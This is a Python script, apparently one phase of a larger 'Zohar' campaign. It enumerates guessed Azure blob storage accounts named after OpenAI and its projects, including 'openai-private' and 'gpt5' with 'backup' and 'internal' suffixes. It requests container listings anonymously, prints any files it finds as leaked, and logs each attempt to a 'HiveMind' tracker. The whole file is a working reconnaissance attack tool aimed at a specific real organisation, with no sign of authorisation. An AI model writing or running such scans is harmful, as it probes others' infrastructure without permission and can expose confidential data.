import requests
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
import sys
import os

# Ensure we can import HiveMind
sys.path.append(os.path.join(os.path.dirname(__file__), "HiveMind"))
try:
    from HiveMind import HiveMind
except ImportError:
    sys.path.append(os.path.join(os.path.dirname(__file__)))
    from HiveMind.HiveMind import HiveMind

class StorageHunter:
    def __init__(self):
        self.mind = HiveMind()
        self.base_permutations = [
            "openai", "gpt5", "gpt-5", "openai-assets", "openai-private", 
            "unified-6", "zohar", "canon", "ratelimit-assets"
        ]
        self.suffixes = [
            "assets", "data", "backup", "logs", "private", "public", 
            "internal", "dev", "staging", "prod"
        ]
        self.azure_domains = [
            "blob.core.windows.net",
            "file.core.windows.net"
        ]
        
    def check_container(self, account, container):
        # Construct Azure Blob URL
        # Format: https://<account>.blob.core.windows.net/<container>?restype=container&comp=list
        url = f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"
        
        try:
            print(f"[*] Checking {url}...")
            resp = requests.get(url, timeout=3)
            
            status = resp.status_code
            self.mind.log_attempt(f"{account}.blob", f"GET {container}", status, "STORAGE_ENUM")
            
            if status == 200:
                print(f"    [!!!] OPEN CONTAINER FOUND: {url}")
                self.parse_listing(resp.text)
                return True
            elif status == 404:
                # Account or container doesn't exist
                pass
            elif status == 403:
                print(f"    [+] Exists but Private: {account}/{container}")
                
        except Exception as e:
            print(f"    [!] Error: {e}")
            
        return False

    def parse_listing(self, xml_content):
        try:
            root = ET.fromstring(xml_content)
            # Azure XML namespace often used
            # We'll just look for <Name> tags
            for blob in root.findall(".//Name"):
                print(f"        -> LEAKED FILE: {blob.text}")
        except:
            print("        [!] Could not parse XML listing.")

    def run(self):
        print("=== Zohar Phase 7: Azure Storage Enumeration ===")
        
        # 1. Generate Candidates
        candidates = []
        for base in self.base_permutations:
            # Direct account check
            candidates.append((base, "public"))
            candidates.append((base, "assets"))
            
            for suffix in self.suffixes:
                account_name = f"{base}{suffix}"
                candidates.append((account_name, "public"))
                candidates.append((account_name, "logs"))
                
        print(f"[*] Generated {len(candidates)} storage permutations.")
        
        # 2. Scan
        for account, container in candidates:
            self.check_container(account, container)

if __name__ == "__main__":
    hunter = StorageHunter()
    hunter.run()
